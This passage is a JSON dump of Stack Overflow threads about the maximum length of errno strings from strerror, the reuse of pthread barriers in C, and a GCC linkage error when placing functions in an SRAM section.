"profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459374686, "post_id": 36318928, "comment_id": 60264097, "body": "@chux: Sure, that&#39;s a the maximum possible limit that logically follows from the standards&#39; definitions of those functions, yes: But surely the existence of unknown-unknowns justifies asking, in case there was some other, smaller limit. Also note: you can write portable code which takes advantage of smaller non-portable limits if those limits have a portable way to check for their presence (e.g. imagine a <code>fooUNIX</code> which defines a macro <code>ERR_STR_LEN_MAX</code> and a macro <code>__FOO_UNIX</code> that can be checked for with an <code>#ifdef</code>.)"}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459379725, "post_id": 36318928, "comment_id": 60266013, "body": "@Olaf: After some serious consideration, I have to disagree in this special case, because the question also has an &quot;at compile time&quot; limitation: I know C++ can do some serious magic with template metaprogramming and the like, but it doesn&#39;t seem like (especially given the answers that come in), that there&#39;s a difference between the two languages in this regard: the answer more or less seems to come down to &quot;no&quot; or &quot;no (except maybe on some systems there&#39;s a preprocessor macro defined that gives an upper bound)&quot;, which is equally applicable to either language."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1459380215, "post_id": 36318928, "comment_id": 60266167, "body": "@mtraceur I agree this is a good post (hence my UV), it is just that, IMO, there is no possible answer that is highly satisfactory.  It is certainty reasonable to survey a number of diverse systems, check their max error message lengths, and use that limit, with x4 for margin.  In this special case of error handling, the whole system is in question and a excessively long error message should be viewed with suspicion.  IMO, it makes sense to limit to few 100 bytes and print a truncated valid message rather than print a 2G byte message from a de-graded system."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459383024, "post_id": 36318928, "comment_id": 60267081, "body": "@mtraceur: There might be a meta-programming solution: Write a program which \u2013 at build-time \u2013 gets all strings, calculates the length and passes a macro with the max. length to the module or generates a config-file. With a proper build-system, this can be written directly in the build-script. SCons comes into mind, as that is written in Python and the build-scripts are actually Python programs with full access to the features. Doner properly, this is only run once per clean build, so no real impact on incremental builds."}, {"owner": {"reputation": 22422, "user_id": 634919, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f4a87fe094961af20263d8e7ff445b2?s=128&d=identicon&r=PG", "display_name": "Nate Eldredge", "link": "https://stackoverflow.com/users/634919/nate-eldredge"}, "edited": false, "score": 1, "creation_date": 1459401367, "post_id": 36318928, "comment_id": 60272043, "body": "Based on answers going in different directions, could you clarify something: is your concern that some system might have some errno string whose length is close to <code>SSIZE_MAX</code> (incredibly unlikely)?  Or are you planning to write a number of bytes that is already close to <code>SSIZE_MAX</code>, and you are concerned that a moderately long errno string might push you over?"}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1459403522, "post_id": 36318928, "comment_id": 60272908, "body": "@chux: I see. I suspected that I wouldn&#39;t find a satisfactory answer, but a definitive &quot;no&quot; answer is still valuable, I think. As to the error printing, I agree: a system with huge error messages shouldn&#39;t really be &quot;trusted&quot;. The more I think about it the more I&#39;m starting to fathom just how ridiculous my concern was: honoring an error message which for some reason turns out to be huge may well be the wrong behavior, and I&#39;ve been unquestioningly thinking it&#39;s the &quot;correct&quot; thing for me to account for huge error messages. Truncation may well be the most &quot;right&quot; thing to do in such cases."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459403926, "post_id": 36318928, "comment_id": 60273087, "body": "@Olaf: Agreed re: metaprogramming, but to clarify my last comment specifically mentioned C++&#39;s <i>template</i> metaprogramming, in the sense that the only way I could see this developing different answers for the two languages (C vs. C++) was if C++&#39;s templates or other features could be abused to do that search at compile-time, from within the source of the being-compiled program. I think(?) any external program, while an interesting solution, would be outside the scope of the question, since my question explicitly asks if there&#39;s a better way than extrernal bruteforce search to generate a header."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 22422, "user_id": 634919, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6f4a87fe094961af20263d8e7ff445b2?s=128&d=identicon&r=PG", "display_name": "Nate Eldredge", "link": "https://stackoverflow.com/users/634919/nate-eldredge"}, "edited": false, "score": 0, "creation_date": 1459404063, "post_id": 36318928, "comment_id": 60273157, "body": "@NateEldredge: The latter was the line of reasoning that initially caused me to ask the question, though I thought the question was more valuable as stated. Still, I&#39;ll add it to the &quot;Motivation&quot; section in my question, as it&#39;s likely useful contextual information."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459518056, "post_id": 36318928, "comment_id": 60335423, "body": "@mtraceur: I did not reply to your comment. It was just an idea which came into mind, unrelated to the preceeding comment. (btw., typo: &quot;Doner&quot; should be &quot;Done&quot;; not related to the tasty turkish food - maybe I was a bit hungry:-)"}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 3, "creation_date": 1459370625, "post_id": 36319109, "comment_id": 60261976, "body": "I&#39;m inclined to agree that the standard makes no guarantee in this area, but I don&#39;t think cppreference.com is an authoritative reference for that."}], "tags": [], "owner": {"reputation": 3725, "user_id": 2209008, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/MceJL.jpg?s=128&g=1", "display_name": "Colin Basnett", "link": "https://stackoverflow.com/users/2209008/colin-basnett"}, "is_accepted": false, "score": 3, "last_activity_date": 1459390600, "last_edit_date": 1459390600, "creation_date": 1459369806, "answer_id": 36319109, "question_id": 36318928, "link": "https://stackoverflow.com/questions/36318928/c-c-maximum-size-of-errno-associated-strings-at-compile-time/36319109#36319109", "title": "C/C++: maximum size of errno-associated strings (at compile-time)", "body": "<p><a href=\"http://en.cppreference.com/w/cpp/string/byte/strerror\" rel=\"nofollow\">The standards make no guarantees</a> about the size limits of the null-terminated string returned by <code>strerror</code>.</p>\n\n<p>In practice, this is never going to be an issue. However, if you're that paranoid about it, I would suggest that you just copy the string returned from <code>strerr</code> and clamp its length to <code>SSIZE_MAX</code> before passing it to <code>writev</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "edited": false, "score": 0, "creation_date": 1459374032, "post_id": 36319243, "comment_id": 60263810, "body": "+1, though note that having an upper bound would be great for choosing a size for the buffer passed to <code>strerror_r</code> as well, reducing the need for runtime logic. Also, I had considered and was aware of the maxima-could-change-out-from-under-your-program situation - but I was hoping that there was some standard limitation, or at least platform-specific macros we could check on at least some systems, that could&#39;ve possibly made that a non-issue for at least some systems, hence the question."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "edited": false, "score": 1, "creation_date": 1459405336, "post_id": 36319243, "comment_id": 60273835, "body": "In particular, it&#39;s noteworthy that POSIX (per your link) allows <code>strerror_r</code> to fail with an <code>ERANGE</code> if the buffer given to it isn&#39;t big enough: my reading suggests that an implementation which checks for the length first, and errors out without writing anything, would be standard-compliant. I want to believe no implementation does this, or I&#39;m misreading, but if so, then it seems without knowing an upper bound it seems we must either err on the side of a moderately generous buffer to hold it, or a loop to reallocate until it returns success?"}, {"owner": {"reputation": 583, "user_id": 1069745, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IVqrE.png?s=128&g=1", "display_name": "Carlos O&#39;Donell", "link": "https://stackoverflow.com/users/1069745/carlos-odonell"}, "reply_to_user": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "edited": false, "score": 1, "creation_date": 1459525560, "post_id": 36319243, "comment_id": 60340505, "body": "There is no guarantee that the <code>strerrorbuf</code> was modified by a call to <code>strerror_r</code> which returned <code>ERANGE</code>. So you must be prepared to handle the various combinations of returns as specified in the normative text of the standard."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "edited": false, "score": 0, "creation_date": 1459532101, "post_id": 36319243, "comment_id": 60344419, "body": "After a few days of contemplation, I am (tentatively) accepting this answer, because it is both 1) general and 2) provides the most thorough explanations as to why such information could not (and perhaps should not) be available at compile time for many implementations."}], "tags": [], "owner": {"reputation": 583, "user_id": 1069745, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IVqrE.png?s=128&g=1", "display_name": "Carlos O&#39;Donell", "link": "https://stackoverflow.com/users/1069745/carlos-odonell"}, "is_accepted": true, "score": 16, "last_activity_date": 1459370319, "creation_date": 1459370319, "answer_id": 36319243, "question_id": 36318928, "link": "https://stackoverflow.com/questions/36318928/c-c-maximum-size-of-errno-associated-strings-at-compile-time/36319243#36319243", "title": "C/C++: maximum size of errno-associated strings (at compile-time)", "body": "<p>The C library that you build against may not be the same (ABI compatible C library maybe used) or even exact version of the C library (On GNU/Linux consider glibc 2.2.5 vs. glibc 2.23) that you run against, therefore computing the maximum size of the locale-dependent string returned from <code>strerror</code> can only be done at runtime during process execution. On top of this the locale translations may be updated on the target system at any time, and this again invalidates any pre-computation of this upper bound.</p>\n\n<p>Unfortunately there is no guarantee that the values returned by <code>strerror</code> are constant for the lifetime of the process, and so they may also change at a later time, thus invalidating any early computation of the bound.</p>\n\n<p>I suggest using <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/strerror.html\">strerror_r</a> to save the error string and avoid any issues with non-multi-thread aware libraries that might call sterror and possibly change the result of the string as you are copying it. Then instead of translating the string on-the-fly you would use the saved result, and potentially truncate to <code>SSIZE_MAX</code> (never going to happen in reality).</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1459370888, "post_id": 36319264, "comment_id": 60262135, "body": "Detail: &quot;This is because usable system memory (usable directly by your C program) can be no larger than SIZE_MAX&quot; --&gt; disagree,  <code>SIZE_MAX</code> is the max value of an array index for a <i>single</i> array, not the maximum amount of memory.  Concerning <code>SSIZE_MAX</code>: that is not defined in C, so best to cite your reference."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459371221, "post_id": 36319264, "comment_id": 60262316, "body": "<code>SIZE_MAX</code> is also the maximum size of the portion of a C2011 <code>struct</code> up to but not including the last member, because it is the type of the result of the standard <code>offsetof()</code> macro."}, {"owner": {"reputation": 11342, "user_id": 299301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9d84c403343c5d7cb9d6abdb26a9a81?s=128&d=identicon&r=PG", "display_name": "nategoose", "link": "https://stackoverflow.com/users/299301/nategoose"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459453275, "post_id": 36319264, "comment_id": 60306463, "body": "@chux: standard C has a flat (von Neumann) memory model, and all of that memory may be treated as a single array (<code>((char *)0)[x]</code>). C compilers for Harvard (like most AVR and 8051 MCUs) , segmented (like 80286), or other systems often use non-standard language extensions to achieve access to the different areas of memory or introduce restrictions to language features to avoid some memory model issues. the answer of <a href=\"http://stackoverflow.com/questions/8649018/what-is-the-difference-between-ssize-t-and-ptrdiff-t\" title=\"what is the difference between ssize t and ptrdiff t\">stackoverflow.com/questions/8649018/&hellip;</a> disagrees, but writev on with those imitations would be severely limited."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459453618, "post_id": 36319264, "comment_id": 60306675, "body": "Post C stand references that support that.  By my reading there are none, so disagree with the unsupported &quot;standard C has a flat (von Neumann) memory model, and all of that memory may be treated as a single array (((char *)0)[x])&quot; and <i>only</i> that model."}], "tags": [], "owner": {"reputation": 11342, "user_id": 299301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9d84c403343c5d7cb9d6abdb26a9a81?s=128&d=identicon&r=PG", "display_name": "nategoose", "link": "https://stackoverflow.com/users/299301/nategoose"}, "is_accepted": false, "score": 2, "last_activity_date": 1459370402, "creation_date": 1459370402, "answer_id": 36319264, "question_id": 36318928, "link": "https://stackoverflow.com/questions/36318928/c-c-maximum-size-of-errno-associated-strings-at-compile-time/36319264#36319264", "title": "C/C++: maximum size of errno-associated strings (at compile-time)", "body": "<p>It is safe to assume that <code>SSIZE_MAX</code> will be greater than the longest string (character array) that strerror returns in a normal C or C++ system.  This is because usable system memory (usable directly by your C program) can be no larger than <code>SIZE_MAX</code> (an unsigned integer value) and <code>SSIZE_MAX</code> will have at least the same number of bits so using 2's compliment math to account for the signed nature of SSIZE_MAX (and ssize_t) SSIZE_MAX will be at least 1/2 the size of system memory.</p>\n"}, {"comments": [{"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "edited": false, "score": 1, "creation_date": 1459400780, "post_id": 36319444, "comment_id": 60271858, "body": "I was able to get <code>NL_TEXTMAX</code> defined by defining <code>_GNU_SOURCE</code>. I therefore suspect that a sufficiently &quot;high&quot; value defined for <code>_POSIX_C_SOURCE</code> would get it included. Anyway, the value was <code>0x7fffffff</code>, or 2147483647. Not too inspiring on its own - though <code>SSIZE_MAX</code> was twice as wide (8 more trailing <code>f</code> digits)."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "edited": false, "score": 0, "creation_date": 1459532466, "post_id": 36319444, "comment_id": 60344613, "body": "For the record, I +1&#39;ed this as well, and I appreciated the information given with regard to my specific use-case. Even though I currently accepted another answer, I think this is the next-best answer, because it covers information not given in the main answer, and does suggest (albeit inconclusively) that some implementations, or other standards built on top of the language specifications, might in fact define some sort of upper limits."}], "tags": [], "owner": {"reputation": 21714, "user_id": 1392132, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QF6FZ.jpg?s=128&g=1", "display_name": "5gon12eder", "link": "https://stackoverflow.com/users/1392132/5gon12eder"}, "is_accepted": false, "score": 5, "last_activity_date": 1459371050, "creation_date": 1459371050, "answer_id": 36319444, "question_id": 36318928, "link": "https://stackoverflow.com/questions/36318928/c-c-maximum-size-of-errno-associated-strings-at-compile-time/36319444#36319444", "title": "C/C++: maximum size of errno-associated strings (at compile-time)", "body": "<p>I'm not aware that the C or C++ standards make any assertions regarding the length of these messages. The platforms you're interested in might provide some stronger implementation-defined guarantees, though.</p>\n\n<p>For example, for POSIX systems, I found the following in <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/basedefs/limits.h.html\" rel=\"noreferrer\"><code>limits.h</code></a>.</p>\n\n<blockquote>\n  <p>The following constants shall be defined on all implementations in <code>&lt;limits.h&gt;</code>:</p>\n  \n  <ul>\n  <li>[\u2026]</li>\n  <li><code>{NL_TEXTMAX}</code><br />\n  Maximum number of bytes in a message string.<br />\n  Minimum Acceptable Value: <code>{_POSIX2_LINE_MAX}</code></li>\n  </ul>\n</blockquote>\n\n<p>I believe that error messages produced by <code>strerror</code> would fall into this category.</p>\n\n<p>That said, I'm unable to get this macro on my system. However, I do have <code>_POSIX2_LINE_MAX</code> (from <code>&lt;unistd.h&gt;</code>). It is <code>#define</code>d to 2048. Since the standard only says that this is a lower bound, that might not be too helpful, though.</p>\n"}], "owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1513, "favorite_count": 1, "accepted_answer_id": 36319243, "answer_count": 4, "score": 16, "last_activity_date": 1542325314, "creation_date": 1459369163, "last_edit_date": 1542325314, "question_id": 36318928, "link": "https://stackoverflow.com/questions/36318928/c-c-maximum-size-of-errno-associated-strings-at-compile-time", "title": "C/C++: maximum size of errno-associated strings (at compile-time)", "body": "<h2>Question</h2>\n\n<p>Is there any way to get the maximum size of any string correlated with <code>errno</code> at compile time (at preprocessor time would be even better)? E.g. an upper bound on <code>strlen(strerror(errno))</code>?</p>\n\n<h2>My Thoughts</h2>\n\n<p>The best I can think of is running a program to do a brute-force search over the range of an int, over each locale, to get the string associated with each {errno, locale} pair, get its size, and generate a header on that system, then hooking that into e.g. a makefile or autoconf or whatever. I can't think of a better way to do it, but it seems ridiculous that it would be so: the standard library for a system has that information built-in, if only implicitly. Is there really no good way to get that information?</p>\n\n<p>Okay, I'll admit the C and/or C++ standards might permit for error strings generated at runtime, with e.g. specific-to-circumstance messages (e.g. <code>strerror(EINVAL)</code> giving a string derived from other runtime metadata set when <code>errno</code> was last set, or something) - not sure if that <em>is</em> allowed, and I'd actually welcome such an implementation, but I've never heard of one existing which did so, or had more than one string for a given {<code>errno</code>, locale} pair.</p>\n\n<h2>Motivation</h2>\n\n<p>For context, what I specifically wanted (but I think this question is valuable in a more general way, as was discussed amongst the comments) that led to this question was to be able to use the error string associated with <code>errno</code> in the syscall/function <code>writev</code>. In my specific usecase, I was using strings out of <code>argv</code> <em>and</em> <code>errno</code>-linked strings. This set my \"worst-case\" length to <code>ARG_MAX</code> + <code>some max errno string length</code> + <code>size of a few other small strings</code>).</p>\n\n<p>Every *nix document I've consulted seems to indicate <code>writev</code> will (or \"may\", for what little good that difference makes in this case) error out with <code>errno</code> set to <code>EINVAL</code> if the sum of the <code>iov_len</code> values overflows <code>SSIZE_MAX</code>. Intuitively, I know every <code>errno</code> string I've seen is very short, and in practice this is a non-issue. But I don't want my code mysteriously failing to print an error at all on some system if it's possible for this assumption to be false. So I wrote code to handle such a case - but at the same time, I don't want that additional code being compiled in for the platforms which generally clearly don't need it.</p>\n\n<p>The combined input of the answers and comments so far is making me lean towards thinking that in my particular use-case, the \"right\" solution is to just truncate obscenely long messages - but this is why I asked the question how I did initially: such information would also help select a size for a buffer to <code>strerror_r</code>/<code>strerror_s</code> (*nix/Windows respectively), and even a negative answer (e.g. \"you can't really do it\") is in my view useful for others' education.</p>\n\n<h2>Related</h2>\n\n<p><a href=\"https://stackoverflow.com/questions/22856387/maximum-size-of-message-for-strerror-r-on-vxworks\">This question</a> contains answers for the strings given by <code>strerror_r</code> on VxWorks, but I don't feel comfortable generalizing that to all systems.</p>\n"}, {"tags": ["c", "pthreads", "barrier"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459368497, "post_id": 36318516, "comment_id": 60260776, "body": "What was the function value returned by <code>pthread_barrier_init</code>? And the other functions?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459368760, "post_id": 36318516, "comment_id": 60260906, "body": "A barrier does not &quot;control the flow&quot;, but is a synchronisation point. Program flow is controlled by conditional statements, etc."}], "answers": [{"tags": [], "owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "is_accepted": false, "score": 13, "last_activity_date": 1459368386, "creation_date": 1459368386, "answer_id": 36318691, "question_id": 36318516, "link": "https://stackoverflow.com/questions/36318516/are-pthread-barriers-in-c-reusable/36318691#36318691", "title": "Are Pthread Barriers in C Reusable?", "body": "<p>Yes, they are reusable. The <a href=\"http://linux.die.net/man/3/pthread_barrier_wait\" rel=\"noreferrer\">man page says</a>:</p>\n\n<blockquote>\n  <p>When the required number of threads have called pthread_barrier_wait()...the barrier shall be\n  reset to the state it had as a result of the most recent\n  pthread_barrier_init() function that referenced it.</p>\n</blockquote>\n"}], "owner": {"reputation": 81, "user_id": 5758534, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-B7ulcOmyifE/AAAAAAAAAAI/AAAAAAAAAHI/gX0PzjRi8KY/photo.jpg?sz=128", "display_name": "Callahan Johnson", "link": "https://stackoverflow.com/users/5758534/callahan-johnson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3214, "favorite_count": 1, "answer_count": 1, "score": 8, "last_activity_date": 1459368386, "creation_date": 1459367821, "question_id": 36318516, "link": "https://stackoverflow.com/questions/36318516/are-pthread-barriers-in-c-reusable", "title": "Are Pthread Barriers in C Reusable?", "body": "<p>So I know that you can create barriers in C to control the flow of a threaded program. You can initialize the barrier, have your threads use it, and then destroy it. However, I am unsure whether or not the same barrier can be reused (say if it were in a loop). Or must you use a new barrier for a second wait point? As an example, is the below code correct (reusing the same barrier)?</p>\n\n<pre><code>#include &lt;pthread.h&gt;\npthread_barrier_t barrier;\n\nvoid* thread_func (void *not_used) {\n     //some code\n     pthread_barrier_wait(&amp;barrier);\n     //some more code\n     pthread_barrier_wait(&amp;barrier);\n     //even more code\n}\n\nint main() {\n    pthread_barrier_init (&amp;barrier, NULL, 2);\n    pthread_t tid[2];\n    pthread_create (&amp;tid[0], NULL, thread_func, NULL);\n    pthread_create (&amp;tid[1], NULL, thread_func, NULL);\n    pthread_join(tid[0], NULL);\n    pthread_join(tid[1], NULL);\n    pthread_barrier_destroy(&amp;barrier);\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "compiler-errors", "linkage"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459367222, "post_id": 36318253, "comment_id": 60260046, "body": "You cannot use cache like regular memory. It is managed by the hardware automatically and one cache-line can hold the contents of different addresses (not at the same time, of course)."}, {"owner": {"reputation": 361, "user_id": 1706587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/55ccfb19b731a8669175ad1a642a0cf5?s=128&d=identicon&r=PG", "display_name": "tozak", "link": "https://stackoverflow.com/users/1706587/tozak"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459367342, "post_id": 36318253, "comment_id": 60260122, "body": "This is actually a memory unit called Multicore Shared Memory and I can use it like a SRAM. I have already some data structures mapped to this memory. But I am trying to use a free section of it like a program memory. Regardless, there are caches in some architectures that you can use like a &quot;regular memory&quot;, if you configure the cache like as a SRAM."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459367506, "post_id": 36318253, "comment_id": 60260206, "body": "But you have to configure it to work as SRAM. So with regard to the question it is not a cache anymore. Presuming your problem is not the configuration, in which case more information is required. Also note that your gcc is quite outdated. Especially the ARM support has quite advanced in newer versions, but also LTO has some problems in this version."}, {"owner": {"reputation": 361, "user_id": 1706587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/55ccfb19b731a8669175ad1a642a0cf5?s=128&d=identicon&r=PG", "display_name": "tozak", "link": "https://stackoverflow.com/users/1706587/tozak"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459367632, "post_id": 36318253, "comment_id": 60260284, "body": "I will try with the new version and share the results here."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459368051, "post_id": 36318253, "comment_id": 60260507, "body": "Just to state this clear: I did not say this will remove the problem. It is just a good idea in general."}], "owner": {"reputation": 361, "user_id": 1706587, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/55ccfb19b731a8669175ad1a642a0cf5?s=128&d=identicon&r=PG", "display_name": "tozak", "link": "https://stackoverflow.com/users/1706587/tozak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 344, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1459413123, "creation_date": 1459366999, "last_edit_date": 1459408051, "question_id": 36318253, "link": "https://stackoverflow.com/questions/36318253/linkage-error-in-gcc-when-mapping-a-function-to-a-different-memory-section", "title": "Linkage error in GCC when mapping a function to a different memory section", "body": "<p><strong>Purpose:</strong></p>\n\n<p>I am trying to re-map some certain functions from DDR to L3 cache, which is programmed as SRAM. I am using GNU Embedded Tools GCC 4.7.4 as my compiler.</p>\n\n<p><strong>What I do (which will lead to my question):</strong></p>\n\n<pre><code>void __attribute__ ((noinline, section (\"msmc_program\"))) my_func1(unsigned int param0) {\n//function body\n}\n</code></pre>\n\n<p>This works with most of the functions. It compiles successfully and I can confirm the mapping 